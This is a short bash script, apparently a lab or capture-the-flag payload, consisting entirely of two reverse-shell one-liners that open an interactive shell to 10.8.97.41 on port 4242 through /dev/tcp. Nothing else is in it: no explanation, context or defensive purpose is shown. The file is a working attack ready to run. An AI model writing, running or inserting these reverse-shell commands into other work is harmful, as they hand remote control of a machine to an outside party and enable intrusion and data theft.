#!/bin/bash

bash -i >& /dev/tcp/10.8.97.41/4242 0>&1
0<&196;exec 196<>/dev/tcp/10.8.97.41/4242; sh <&196 >&196 2>&196
